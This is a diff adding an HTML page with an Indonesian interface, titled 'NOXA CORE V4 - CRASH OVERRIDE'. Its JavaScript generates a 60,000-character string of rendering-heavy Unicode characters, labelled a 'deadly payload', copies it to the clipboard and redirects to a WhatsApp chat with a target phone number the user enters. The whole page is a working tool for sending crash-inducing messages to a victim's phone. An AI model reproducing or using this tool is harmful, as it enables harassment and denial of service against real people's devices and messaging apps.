@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>NOXA CORE V4 - CRASH OVERRIDE</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .box { border: 2px solid #00ff00; background: #0a0a0a; padding: 20px; box-shadow: 0 0 30px #00ff00; max-width: 700px; margin: auto; }
+        h1 { color: #ff0000; letter-spacing: 5px; text-shadow: 2px 2px #fff; }
+        textarea { width: 100%; height: 200px; background: #111; color: #ff0000; border: 1px solid #444; font-size: 8px; overflow-y: scroll; margin: 15px 0; }
+        .btn { background: #ff0000; color: #fff; padding: 15px; width: 100%; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 16px; }
+        .btn:hover { background: #fff; color: #ff0000; }
+        .info { color: #fff; font-size: 12px; border-left: 5px solid #ff0000; padding: 10px; background: #222; text-align: left; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>NOXA CORE V4</h1>
+        <div class="info">
+            <strong>SURS CORE STATUS:</strong> ONLINE<br>
+            <strong>PAYLOAD TYPE:</strong> UNICODE OVERFLOW (60,000+ CHARS)<br>
+            <strong>INSTRUCTION:</strong> Klik tombol di bawah, lalu klik "Copy Payload", kemudian kirim ke target.
+        </div>
+        
+        <input type="text" id="num" placeholder="Nomor Target: 628xxxx" style="width:95%; padding:10px; margin-bottom:10px; background:#000; color:#00ff00; border:1px solid #00ff00;">
+        
+        <button class="btn" onclick="generatePayload()">1. GENERATE DEADLY PAYLOAD</button>
+        
+        <textarea id="payloadBox" readonly placeholder="Payload akan muncul di sini..."></textarea>
+        
+        <button class="btn" style="background:#00ff00; color:#000;" onclick="copyAndGo()">2. COPY & ATTACK TARGET</button>
+    </div>
+
+    <script>
+        function generatePayload() {
+            let pBox = document.getElementById('payloadBox');
+            // Kombinasi karakter Unicode paling mematikan bagi rendering engine
+            let chars = ["ဪ", "꧀", "ॣ", "ी", "ू", "ा", "्", "ि", "҈", "﷽", "𒀱", "𒈓", "𒈙"];
+            let result = "NOXA_SYSTEM_DEATH_";
+            for(let i=0; i<60000; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            pBox.value = result;
+            alert("Payload Berhasil Dibuat! Silakan klik tombol hijau.");
+        }
+
+        function copyAndGo() {
+            let num = document.getElementById('num').value;
+            let pBox = document.getElementById('payloadBox');
+            if(pBox.value == "") { alert("Klik tombol Generate dulu!"); return; }
+            if(num == "") { alert("Masukkan nomor target!"); return; }
+
+            pBox.select();
+            pBox.setSelectionRange(0, 99999); // Untuk mobile
+            document.execCommand("copy");
+            
+            alert("Payload 60.000 Karakter Tersalin! Mengarahkan ke WhatsApp...");
+            window.location.href = "https://wa.me/" + num;
+        }
+    </script>
+</body>
+</html>
